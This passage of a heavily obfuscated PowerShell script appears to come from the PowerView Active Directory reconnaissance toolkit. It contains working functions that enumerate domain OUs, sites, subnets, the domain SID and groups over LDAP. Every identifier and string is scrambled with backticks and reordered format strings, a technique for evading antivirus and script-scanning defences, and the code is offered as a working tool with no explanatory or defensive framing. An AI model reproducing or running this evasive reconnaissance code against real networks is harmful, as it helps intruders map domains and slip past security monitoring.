            ${o`USeAR`c`her}."f`iL`Ter" = "(&(objectCategory=organizationalUnit)$Filter)"
            &("{4}{3}{1}{0}{2}" -f'bo','e-Ver','se','t','Wri') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if (${pS`BOun`DP`AR`Amet`eRS}[("{1}{0}" -f 'ndOne','Fi')]) { ${REsul`TS} = ${oUS`e`A`RchEr}.("{1}{0}"-f 'dOne','Fin').Invoke() }
            else { ${Res`Ults} = ${Ouse`AR`cHer}.("{1}{0}{2}"-f 'nd','Fi','All').Invoke() }
            ${r`e`SUlts} | &("{1}{2}{0}" -f'-Object','Wher','e') {${_}} | &("{1}{2}{3}{0}" -f 'ct','ForEach-','Ob','je') {
                if (${PsBou`NdPAramET`e`RS}['Raw']) {
                    
                    ${O`U} = ${_}
                }
                else {
                    ${o`U} = &("{0}{1}{5}{3}{2}{4}"-f'Co','n','Proper','-LDAP','ty','vert') -Properties ${_}."PrOp`ERT`Ies"
                }
                ${O`U}."P`sObJeCT"."Typ`eNam`es".("{2}{1}{0}"-f 't','ser','In').Invoke(0, ("{3}{0}{1}{2}" -f 'ow','er','View.OU','P'))
                ${OU}
            }
            if (${r`EsUlTS}) {
                try { ${RES`UL`Ts}.("{0}{1}"-f 'dispo','se').Invoke() }
                catch {
                    &("{1}{0}{2}" -f 'ite-Ve','Wr','rbose') ('['+'Get'+'-Domain'+'OU'+'] '+'E'+'rror'+' '+'d'+'isp'+'osing '+'o'+'f '+'t'+'he '+'R'+'es'+'ults '+'obj'+'e'+'ct: '+"$_")
                }
            }
            ${OuseaR`c`h`eR}.("{1}{0}"-f'se','dispo').Invoke()
        }
    }
}


function G`ET-Do`m`AiNS`iTe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{3}{2}" -f 'PSSh','ouldP','ess','roc'}, '')]
    [OutputType({"{1}{3}{2}{0}" -f 'te','PowerV','i','iew.S'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSItION = 0, vaLuEFroMpIPElIne = ${tR`UE}, vALUefrOmPIpeLinEBYpRopeRtyNAme = ${Tr`Ue})]
        [Alias({"{1}{0}" -f 'e','Nam'})]
        [String[]]
        ${i`d`eNtIty},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}" -f 'UID','G'})]
        ${gpL`INk},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'F','ilter'})]
        [String]
        ${lD`ApF`iLter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrO`pErT`IeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'ADSPa','h','t'})]
        [String]
        ${se`ARCHb`A`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{4}{2}" -f'on','ainC','ller','Dom','tro'})]
        [String]
        ${s`ERVER},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{0}{1}{2}"-f 'OneLev','e','l'}, {"{2}{1}{0}" -f'ee','r','Subt'})]
        [String]
        ${sea`RChScO`pE} = ("{1}{2}{0}" -f 'ree','Sub','t'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSul`TpaGE`SI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`VE`R`TImeLI`mIT},

        [ValidateSet({"{1}{0}"-f 'l','Dac'}, {"{1}{0}" -f 'p','Grou'}, {"{0}{1}"-f'No','ne'}, {"{1}{0}"-f 'wner','O'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${s`ECUR`I`TYMAs`Ks},

        [Switch]
        ${tOmbs`TO`Ne},

        [Alias({"{0}{1}{2}" -f 'Ret','urnOn','e'})]
        [Switch]
        ${fI`ND`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRed`En`TiAL} =   ( &("{1}{2}{0}" -f 'AbLE','Get','-Vari')  ("{0}{1}"-f'5r0V','k'))."v`Alue"::"eMP`Ty",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${SeaR`CH`ERA`RguM`e`NTS} = @{
            ("{1}{3}{4}{2}{0}"-f'efix','Searc','sePr','hB','a') = ("{2}{4}{3}{0}{1}" -f',CN=Con','figuration','CN','s','=Site')
        }
        if (${pSBoUNd`Pa`RAmete`Rs}[("{0}{1}" -f 'D','omain')]) { ${se`ARc`HEr`A`RGumE`NTS}[("{0}{1}{2}"-f 'Doma','i','n')] = ${DO`M`AIN} }
        if (${psbOUN`DPA`Ra`mE`TErS}[("{2}{0}{3}{1}"-f'ropert','es','P','i')]) { ${SEAr`Che`RArgU`m`eN`TS}[("{1}{2}{0}"-f's','Pr','opertie')] = ${pR`O`PEr`TieS} }
        if (${psbOU`NdPAram`eT`e`RS}[("{1}{2}{3}{0}" -f'e','S','ear','chBas')]) { ${SEArCh`eR`ARgU`MEn`TS}[("{1}{0}{2}"-f 'archBa','Se','se')] = ${SE`ArcHb`ASe} }
        if (${PsbO`UNdPa`RAmE`T`ERS}[("{1}{0}{2}" -f'e','Serv','r')]) { ${sEa`RcH`E`RArGu`meNtS}[("{0}{2}{1}"-f 'S','er','erv')] = ${s`E`RVER} }
        if (${PsbOu`N`dPa`R`AM`EtERs}[("{1}{0}{2}"-f 'e','S','archScope')]) { ${Se`ARChErargUM`E`N`Ts}[("{1}{0}{2}" -f 'rchS','Sea','cope')] = ${SeAr`CHSc`ope} }
        if (${p`S`BoUn`dPARAm`eTERS}[("{3}{0}{2}{1}" -f 'ltPa','e','geSiz','Resu')]) { ${seAr`C`hERarG`U`mentS}[("{1}{0}{2}" -f'ltPag','Resu','eSize')] = ${ReS`U`ltP`AGeSIzE} }
        if (${P`SBOunDpAra`M`e`TErS}[("{3}{0}{2}{4}{1}" -f 'v','t','erTimeL','Ser','imi')]) { ${S`eA`R`cheRaRgUMEnTS}[("{1}{4}{2}{3}{0}"-f't','ServerT','eLi','mi','im')] = ${sErve`RtIMe`lI`m`it} }
        if (${Ps`B`OUnDpA`RAme`TERS}[("{4}{3}{2}{0}{1}" -f'Mas','ks','ity','cur','Se')]) { ${sE`A`RCH`ERa`RGUM`eNtS}[("{1}{0}{2}"-f'Mas','Security','ks')] = ${SE`CU`RiTYm`A`sKS} }
        if (${psBoUNDpaRAm`e`TE`RS}[("{1}{0}{2}"-f 'st','Tomb','one')]) { ${S`EA`R`Cherar`Gu`ments}[("{1}{0}{2}"-f'ombst','T','one')] = ${to`MB`sTOne} }
        if (${pSBou`NdPARAME`T`e`RS}[("{0}{2}{1}"-f'Creden','l','tia')]) { ${SeARc`HeRAR`g`Um`eNTS}[("{1}{2}{0}"-f'ial','Creden','t')] = ${cR`E`deNT`IAl} }
        ${S`i`Te`sEarch`eR} = &("{5}{4}{0}{1}{2}{3}"-f'o','main','Sea','rcher','D','Get-') @SearcherArguments
    }

    PROCESS {
        if (${SIT`eS`EarC`heR}) {
            ${Iden`TIt`YfIlt`ER} = ''
            ${F`iL`TeR} = ''
            ${I`DE`NTiTy} | &("{1}{2}{0}"-f 't','Whe','re-Objec') {${_}} | &("{2}{4}{3}{1}{0}"-f't','ec','ForEach-','bj','O') {
                ${IdEntiTyI`NS`TAN`Ce} = ${_}.("{0}{1}{2}" -f'Re','pla','ce').Invoke('(', '\28').("{1}{0}" -f 'lace','Rep').Invoke(')', '\29')
                if (${iDeN`T`ItYins`Ta`Nce} -match ("{0}{1}" -f'^CN=','.*')) {
                    ${iDE`NTi`TYFILT`eR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psBO`UNDPAram`E`TE`RS}[("{0}{1}" -f'Domai','n')]) -and (-not ${pSB`OuND`pAra`mE`T`ErS}[("{2}{3}{0}{1}"-f'a','se','Searc','hB')])) {
                        
                        
                        ${IDENT`I`TY`dO`MaIn} = ${IDentityI`N`S`T`AnCE}.("{1}{0}{3}{2}"-f't','SubS','ing','r').Invoke(${I`dEntI`TYi`N`sTANCe}.("{1}{0}"-f'exOf','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{4}{2}{1}{0}{3}" -f 'b','-Ver','ite','ose','Wr') ('[Get-'+'Do'+'main'+'Si'+'te] '+'Extra'+'c'+'t'+'ed '+'doma'+'in '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${sEA`RChe`R`Argu`mEnTS}[("{0}{1}" -f 'Do','main')] = ${IDeNtI`T`Yd`Om`Ain}
                        ${si`TE`SeA`RCH`er} = &("{2}{4}{0}{3}{1}"-f 'mainSe','her','G','arc','et-Do') @SearcherArguments
                        if (-not ${S`IT`e`SeaRchER}) {
                            &("{3}{1}{0}{2}" -f '-Warn','ite','ing','Wr') ('[Get'+'-'+'DomainS'+'ite] '+'U'+'nable '+'t'+'o '+'r'+'etrieve'+' '+'domain'+' '+'s'+'ea'+'rcher '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${gUId`B`yT`eS`TriNg} = (-Join (([Guid]${i`DeNTitYI`NS`TAnCE}).("{2}{0}{3}{1}"-f 'e','rray','ToByt','A').Invoke() | &("{2}{4}{3}{1}{0}"-f 't','ec','ForEach-','bj','O') {${_}.("{0}{2}{1}" -f 'T','String','o').Invoke('X').("{1}{0}{2}"-f 'adLef','P','t').Invoke(2,'0')})) -Replace (("{1}{0}"-f'..)','(')),'\$1'
                        ${iDentI`T`yF`Il`TER} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${i`DE`NT`iTyFI`LTeR} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${iDeNT`i`Ty`FiL`TER} -and (${Ide`NtIT`yFI`LT`eR}.("{1}{0}" -f'im','Tr').Invoke() -ne '') ) {
                ${fILt`Er} += "(|$IdentityFilter)"
            }

            if (${psb`Ou`NdpA`RAmeTErS}[("{1}{0}"-f'nk','GPLi')]) {
                &("{2}{1}{0}" -f 'rbose','Ve','Write-') ('['+'Ge'+'t-DomainSite]'+' '+'Searchi'+'n'+'g '+'f'+'or '+'sit'+'es'+' '+'with'+' '+"$GPLink "+'se'+'t '+'i'+'n '+'t'+'he '+'gpLi'+'nk'+' '+'p'+'roperty')
                ${F`iLt`eR} += "(gplink=*$GPLink*)"
            }

            if (${psBoUNDP`ArAm`e`T`eRS}[("{2}{1}{0}" -f'r','te','LDAPFil')]) {
                &("{0}{1}{3}{2}"-f 'W','rit','se','e-Verbo') ('['+'Get-DomainSi'+'te]'+' '+'Using'+' '+'additio'+'nal'+' '+'L'+'DAP '+'fil'+'ter'+': '+"$LDAPFilter")
                ${fil`T`Er} += "$LDAPFilter"
            }

            ${S`itE`seARCHer}."fi`L`TER" = "(&(objectCategory=site)$Filter)"
            &("{0}{1}{3}{2}"-f'Writ','e-','bose','Ver') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if (${PSB`oU`ND`pa`RA`metErs}[("{0}{1}"-f 'Find','One')]) { ${r`e`SuLTs} = ${SIT`EsEA`RCh`eR}.("{1}{0}"-f'l','FindAl').Invoke() }
            else { ${R`E`SULtS} = ${SiteSE`A`RChER}.("{0}{2}{1}" -f 'Fi','l','ndAl').Invoke() }
            ${r`es`ULTs} | &("{3}{0}{2}{1}" -f 're-','ct','Obje','Whe') {${_}} | &("{0}{2}{3}{1}" -f'ForE','ject','ach-O','b') {
                if (${psbOuNDp`ARA`mE`TeRS}['Raw']) {
                    
                    ${si`Te} = ${_}
                }
                else {
                    ${si`Te} = &("{1}{0}{4}{3}{2}" -f'on','C','DAPProperty','-L','vert') -Properties ${_}."PR`O`Pe`RtIEs"
                }
                ${S`Ite}."PSOB`jE`CT"."TYp`e`N`AmeS".("{0}{1}"-f 'In','sert').Invoke(0, ("{2}{1}{0}{3}" -f 'i','rV','Powe','ew.Site'))
                ${S`iTe}
            }
            if (${Re`SUl`TS}) {
                try { ${r`eSu`LtS}.("{0}{2}{1}"-f'd','se','ispo').Invoke() }
                catch {
                    &("{2}{0}{1}{3}" -f'e-V','er','Writ','bose') ("{10}{5}{9}{4}{6}{1}{0}{7}{3}{2}{8}"-f 'isposing of the','ror d','s obj','t','te] E','-Domain','r',' Resul','ect','Si','[Get')
                }
            }
            ${SI`TeSEaR`C`HEr}.("{0}{1}{2}"-f 'disp','os','e').Invoke()
        }
    }
}


function G`et-domA`InsUB`N`ET {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{4}{3}{0}" -f 'ess','o','PSSh','Proc','uld'}, '')]
    [OutputType({"{1}{0}{3}{2}"-f 'View','Power','t','.Subne'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOsiTIon = 0, vaLuefrOMpiPeLINe = ${Tr`Ue}, vAlueFRoMPIPElINEbypRoPERtYnAMe = ${t`RUe})]
        [Alias({"{0}{1}" -f'Na','me'})]
        [String[]]
        ${i`De`NtiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${si`TEna`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`mAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Fi','lter'})]
        [String]
        ${l`da`Pf`ilTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pROPeRt`I`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'Path','DS','A'})]
        [String]
        ${s`earc`hBA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{4}{2}{0}"-f 'roller','oma','ont','D','inC'})]
        [String]
        ${S`ERveR},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{2}{1}{0}" -f'vel','e','OneL'}, {"{0}{1}{2}"-f 'Subt','r','ee'})]
        [String]
        ${SE`Ar`cHScOPe} = ("{2}{1}{0}" -f 'ree','t','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`E`SU`ltPAgeSi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRvER`TI`MEli`mIt},

        [ValidateSet({"{0}{1}"-f'Dac','l'}, {"{0}{1}" -f'Gr','oup'}, {"{1}{0}"-f'ne','No'}, {"{0}{1}"-f'Own','er'}, {"{1}{0}" -f'acl','S'})]
        [String]
        ${S`Ec`Ur`iTyMA`sks},

        [Switch]
        ${T`om`BST`ONe},

        [Alias({"{2}{1}{0}"-f'e','nOn','Retur'})]
        [Switch]
        ${fi`N`dONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cred`E`N`TiAL} =   ( &("{2}{1}{0}{3}" -f 't','ChILDi','GEt-','EM') ("{1}{2}{0}{3}"-f'r0V','vARIABle',':5','k')  )."V`AluE"::"eMp`TY",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${SE`Ar`cheraR`g`U`meNTs} = @{
            ("{1}{3}{0}{2}"-f 'Prefi','Se','x','archBase') = ("{6}{0}{3}{2}{7}{4}{8}{1}{5}{9}" -f 'Su','=Co','ts,','bne','ites,','nfigura','CN=','CN=S','CN','tion')
        }
        if (${pSbOUn`dPaRA`met`ERS}[("{0}{1}{2}"-f 'Dom','ai','n')]) { ${s`E`ArcH`eRaRG`Um`eNtS}[("{0}{1}" -f'Dom','ain')] = ${d`omaIn} }
        if (${PsbOu`NDpAR`Am`ETE`RS}[("{0}{2}{1}"-f'Prope','es','rti')]) { ${se`A`RChE`RArGUMeNts}[("{1}{2}{0}" -f 'ties','Prope','r')] = ${pr`oPErti`es} }
        if (${pS`B`OundPA`RaMEteRs}[("{2}{0}{1}"-f'ch','Base','Sear')]) { ${seArc`herAr`G`UM`En`TS}[("{1}{2}{0}{3}" -f'chBa','S','ear','se')] = ${SEA`Rc`HBAsE} }
        if (${PSB`OUNdP`ARAmET`e`Rs}[("{0}{1}"-f 'Se','rver')]) { ${sEaRC`h`eR`AR`gum`ENtS}[("{2}{0}{1}" -f 'v','er','Ser')] = ${s`ERv`ER} }
        if (${P`SbO`Un`DpAR`AMeteRs}[("{3}{0}{2}{1}" -f'S','e','cop','Search')]) { ${SEaRChEr`A`R`g`UmEN`TS}[("{0}{1}{2}" -f 'S','ear','chScope')] = ${SEarc`h`sCO`Pe} }
        if (${PsB`ounDpar`A`m`etErs}[("{0}{2}{3}{1}" -f 'ResultP','ze','ag','eSi')]) { ${sea`R`Ch`ErArgu`m`enTs}[("{0}{4}{3}{1}{2}" -f'R','tPag','eSize','sul','e')] = ${r`E`sUltP`AGe`SiZE} }
        if (${ps`BouNDPA`RAMetE`RS}[("{3}{2}{4}{0}{1}"-f 'mi','t','T','Server','imeLi')]) { ${S`eArCHERa`RgUm`ENTs}[("{4}{2}{1}{0}{3}"-f'eLim','verTim','er','it','S')] = ${seRVe`R`T`iM`eLiMIt} }
        if (${Psbo`U`N`DPa`Ra`METeRs}[("{0}{2}{1}{3}" -f'Secur','M','ity','asks')]) { ${SEar`Ch`Er`ArGUM`eNTs}[("{2}{0}{1}"-f 'ecur','ityMasks','S')] = ${Se`c`URitym`AskS} }
        if (${pSb`ou`Nd`PArAm`ETeRs}[("{1}{0}"-f 'one','Tombst')]) { ${SEa`RCHERArG`U`mE`NtS}[("{0}{2}{1}"-f 'Tomb','e','ston')] = ${tOM`B`sT`one} }
        if (${PsBO`UNd`p`ARAME`TerS}[("{2}{0}{1}" -f'ti','al','Creden')]) { ${sEar`cheRar`GUMEn`Ts}[("{1}{0}{2}"-f'en','Cred','tial')] = ${crED`En`TIAl} }
        ${SUB`N`ETSEarCH`er} = &("{0}{3}{4}{1}{2}"-f 'Get','rch','er','-Doma','inSea') @SearcherArguments
    }

    PROCESS {
        if (${Subn`E`T`sEARChEr}) {
            ${ide`NTITYF`ilt`eR} = ''
            ${fI`lt`eR} = ''
            ${idE`NT`Ity} | &("{1}{0}{2}" -f'bjec','Where-O','t') {${_}} | &("{0}{2}{1}{3}"-f 'For','ach-','E','Object') {
                ${id`eNT`itYINsTa`Nce} = ${_}.("{1}{0}{2}" -f'epl','R','ace').Invoke('(', '\28').("{0}{1}"-f'Repl','ace').Invoke(')', '\29')
                if (${I`D`ENti`TyINsTANCe} -match ("{0}{1}"-f'^CN=.','*')) {
                    ${I`D`eNTI`TyFi`LtEr} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pSb`Oun`dp`ArAmeteRs}[("{1}{0}"-f 'omain','D')]) -and (-not ${pSb`O`U`Ndp`ARAmeterS}[("{1}{2}{0}"-f 'se','Sea','rchBa')])) {
                        
                        
                        ${iDENt`ity`DOMa`IN} = ${i`deNtIT`yI`NsTanCE}.("{1}{0}{2}"-f'Str','Sub','ing').Invoke(${ideNtItyI`NsT`A`N`CE}.("{2}{0}{1}" -f 'O','f','Index').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{0}{2}{3}"-f 't','Wri','e-Verbos','e') ('[Ge'+'t-Dom'+'ai'+'n'+'Subn'+'et] '+'E'+'xtr'+'acted'+' '+'d'+'omain '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${seAr`C`heraRGUM`EnTs}[("{1}{0}{2}" -f'a','Dom','in')] = ${ideN`T`I`TyDO`mAin}
                        ${sUBneT`s`earc`H`ER} = &("{0}{1}{3}{2}{4}"-f 'G','e','-Do','t','mainSearcher') @SearcherArguments
                        if (-not ${suBNE`T`s`eaR`cHer}) {
                            &("{1}{2}{0}" -f'ing','Write-War','n') ('[G'+'et-'+'D'+'omainSu'+'bnet'+']'+' '+'Una'+'bl'+'e '+'to'+' '+'r'+'e'+'trieve '+'d'+'omain '+'s'+'earc'+'her '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${G`U`id`B`YTEStRinG} = (-Join (([Guid]${i`DENtiTyiNSta`N`cE}).("{0}{2}{3}{1}" -f 'To','ay','By','teArr').Invoke() | &("{0}{3}{1}{2}"-f'For','je','ct','Each-Ob') {${_}.("{0}{2}{1}" -f 'ToStr','ng','i').Invoke('X').("{1}{0}"-f 'Left','Pad').Invoke(2,'0')})) -Replace ("{0}{1}"-f '(.','.)'),'\$1'
                        ${iDen`Tityfi`L`T`ER} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${IdEn`TIT`y`Fi`lTER} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${IDEn`TitY`FI`Lt`er} -and (${iD`ENTITY`F`ILTEr}.("{1}{0}" -f 'm','Tri').Invoke() -ne '') ) {
                ${fIl`Ter} += "(|$IdentityFilter)"
            }

            if (${p`sB`OuN`DpaRam`etErS}[("{0}{1}{3}{2}" -f 'LDA','PFil','r','te')]) {
                &("{1}{0}{2}{4}{3}"-f'r','W','ite','bose','-Ver') ('[G'+'et'+'-D'+'omai'+'nS'+'ubnet] '+'Us'+'ing '+'ad'+'d'+'itional '+'LDAP'+' '+'fil'+'t'+'er: '+"$LDAPFilter")
                ${f`I`LTer} += "$LDAPFilter"
            }

            ${su`Bn`Ets`EARc`HeR}."fI`LT`er" = "(&(objectCategory=subnet)$Filter)"
            &("{1}{0}{2}"-f'ite-','Wr','Verbose') "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter) "

            if (${Ps`BOuN`d`P`AraMeTERS}[("{1}{0}{2}" -f'ndO','Fi','ne')]) { ${rE`suLTs} = ${sUb`N`etseA`Rc`Her}.("{0}{2}{1}" -f 'FindO','e','n').Invoke() }
            else { ${rE`SulTs} = ${suB`NetS`Ea`RCH`eR}.("{1}{0}" -f'll','FindA').Invoke() }
            ${resu`LtS} | &("{2}{1}{0}" -f't','here-Objec','W') {${_}} | &("{0}{1}{3}{2}{4}" -f 'F','o','a','rE','ch-Object') {
                if (${pSbOUND`p`AR`A`mEtErs}['Raw']) {
                    
                    ${Su`BneT} = ${_}
                }
                else {
                    ${su`BN`eT} = &("{0}{2}{3}{1}"-f 'Co','t-LDAPProperty','nve','r') -Properties ${_}."PRO`pERtI`es"
                }
                ${su`B`NeT}."p`sOb`JeCT"."tyP`ena`mes".("{2}{0}{1}"-f's','ert','In').Invoke(0, ("{2}{3}{0}{1}"-f '.Su','bnet','Pow','erView'))

                if (${P`sbOun`dPaRam`EtE`RS}[("{2}{0}{1}"-f'eNam','e','Sit')]) {
                    
                    
                    if (${S`U`BneT}."PRo`pe`RtIES" -and (${S`UBnet}."pR`opEr`TIEs"."SIte`oBjE`Ct" -like "*$SiteName*")) {
                        ${s`UBNET}
                    }
                    elseif (${S`U`BNEt}."siteOB`jE`Ct" -like "*$SiteName*") {
                        ${sU`Bn`ET}
                    }
                }
                else {
                    ${SuB`NeT}
                }
            }
            if (${r`eS`ULTS}) {
                try { ${rEsu`LtS}.("{0}{1}" -f'd','ispose').Invoke() }
                catch {
                    &("{0}{2}{4}{3}{1}" -f'W','ose','rite-V','b','er') ('[Get-'+'Doma'+'inSubnet]'+' '+'Erro'+'r '+'disp'+'osi'+'ng'+' '+'of'+' '+'the'+' '+'Res'+'ults'+' '+'object:'+' '+"$_")
                }
            }
            ${S`UB`Ne`TSEAr`Cher}.("{1}{0}"-f 'se','dispo').Invoke()
        }
    }
}


function G`ET-d`o`MainsID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}" -f's','PSS','houldProce','s'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oma`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{4}{0}" -f 'er','o','mainCo','D','ntroll'})]
        [String]
        ${serV`Er},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`d`entIal} =   (  &("{0}{1}" -f'gC','I')  ("Var"+"IaBle"+":5R"+"0V"+"K")  )."V`AlUE"::"EmP`TY"
    )

    ${SEARc`HeRAr`G`UMEntS} = @{
        ("{2}{0}{1}"-f 'te','r','LDAPFil') = ("{0}{4}{3}{7}{12}{10}{1}{9}{2}{5}{6}{8}{11}"-f'(','.2.84','1355','Acco','user','6.1.4','.','untC','803:=81','0.1','rol:1','92)','ont')
    }
    if (${Psb`oU`ND`PArAMEt`Ers}[("{0}{1}" -f 'Dom','ain')]) { ${SeA`RcH`ERaRGu`me`N`Ts}[("{0}{1}{2}" -f'Do','m','ain')] = ${DO`m`AIN} }
    if (${psb`ouNDpaRA`MEt`E`RS}[("{0}{1}"-f'Serve','r')]) { ${SeA`RCh`er`A`Rgu`MentS}[("{1}{0}{2}" -f 'r','Se','ver')] = ${S`ErVER} }
    if (${ps`BoUNdp`A`RAmET`ers}[("{0}{1}{2}{3}"-f 'C','red','entia','l')]) { ${sEArC`H`ErAr`G`UMENts}[("{0}{1}{2}"-f'Cr','eden','tial')] = ${cR`eD`EnTiaL} }

    ${D`CSId} = &("{3}{0}{4}{1}{2}"-f'e','Dom','ainComputer','G','t-') @SearcherArguments -FindOne | &("{0}{2}{3}{1}"-f'S','ect','elect-','Obj') -First 1 -ExpandProperty ("{1}{0}" -f'ectsid','obj')

    if (${DCs`ID}) {
        ${d`CSID}.("{2}{0}{1}" -f'i','ng','SubStr').Invoke(0, ${d`csid}.("{1}{0}{2}" -f'tI','Las','ndexOf').Invoke('-'))
    }
    else {
        &("{0}{1}{2}"-f 'Write-','Verb','ose') ('['+'Get'+'-Dom'+'ai'+'nS'+'ID] '+'Erro'+'r '+'ext'+'ract'+'in'+'g '+'d'+'o'+'main '+'SID'+' '+'fo'+'r '+"'$Domain'")
    }
}


function GeT`-dO`MAi`Ngro`UP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{4}{2}"-f'houldP','PS','cess','S','ro'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{0}{1}{7}{5}{6}{2}" -f'ed','Vars','nts','PSUseDec','lar','ThanAss','ignme','More'}, '')]
    [OutputType({"{1}{0}{2}{3}"-f'w.Gr','PowerVie','o','up'})]
    [CmdletBinding(defauLtPaRaMeteRSETNAMe = {"{4}{3}{2}{0}{1}"-f 'a','tion','eg','l','AllowDe'})]
    Param(
        [Parameter(pOSItIOn = 0, VaLUeFrOMpIpelINE = ${TR`Ue}, vALuEfROmPiPELINEbyproperTYnAMe = ${t`RUe})]
        [Alias({"{4}{3}{2}{1}{0}" -f'ame','dN','he','uis','Disting'}, {"{2}{1}{0}"-f'Name','mAccount','Sa'}, {"{1}{0}"-f 'me','Na'}, {"{2}{3}{0}{5}{1}{6}{4}"-f 'mb','Dis','M','e','dName','er','tinguishe'}, {"{0}{2}{3}{1}"-f 'Me','me','mb','erNa'})]
        [String[]]
        ${i`D`ENtI`Ty},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Use','rName'})]
        [String]
        ${MeM`BeriD`e`NTi`Ty},

        [Switch]
        ${A`DM`i`NCOunt},

        [ValidateSet({"{2}{3}{1}{0}"-f'al','c','Do','mainLo'}, {"{2}{3}{0}{1}{4}" -f'ainLoc','a','Not','Dom','l'}, {"{1}{0}" -f 'obal','Gl'}, {"{0}{1}" -f'NotG','lobal'}, {"{0}{1}"-f'Uni','versal'}, {"{2}{1}{0}" -f 'versal','Uni','Not'})]
        [Alias({"{1}{0}"-f 'cope','S'})]
        [String]
        ${g`ROuPSCo`pe},

        [ValidateSet({"{0}{1}"-f 'Securit','y'}, {"{0}{1}{2}"-f'Distri','but','ion'}, {"{1}{0}{3}{2}" -f 'ate','Cre','tem','dBySys'}, {"{0}{1}{2}{3}" -f'N','ot','CreatedBySys','tem'})]
        [String]
        ${g`RoUPp`RO`PeRtY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'Fil','er','t'})]
        [String]
        ${l`daPFi`LtEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`opEr`TiEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'D','A','SPath'})]
        [String]
        ${s`e`ARcHBASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{4}{0}" -f 'r','ntr','Domain','Co','olle'})]
        [String]
        ${seR`V`eR},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{1}{0}{2}"-f'eLev','On','el'}, {"{2}{1}{0}"-f'e','re','Subt'})]
        [String]
        ${sE`A`RCHs`cOPe} = ("{0}{1}{2}" -f'Su','bt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSu`L`TP`AGEsI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVERT`IMeL`I`MIT},

        [ValidateSet({"{0}{1}"-f 'Dac','l'}, {"{0}{1}" -f'Gr','oup'}, {"{0}{1}" -f'Non','e'}, {"{0}{1}"-f 'Own','er'}, {"{1}{0}"-f 'l','Sac'})]
        [String]
        ${S`ec`UrITY`Ma`skS},

        [Switch]
        ${ToM`Bs`Tone},

        [Alias({"{2}{0}{1}{3}"-f'rnO','n','Retu','e'})]
        [Switch]
        ${fI`N`done},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReD`ent`IAL} =  ( &("{0}{3}{1}{2}"-f'GeT','ArIA','Ble','-V') ("{1}{0}"-f 'K','5R0V') -vaLu )::"E`mPTy",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${se`ARcHerarG`U`mENTS} = @{}
        if (${PsBo`U`NdpaRa`mE`Te`RS}[("{0}{1}" -f'D','omain')]) { ${searc`H`erARGUm`EN`Ts}[("{0}{1}" -f'Doma','in')] = ${d`OmaiN} }
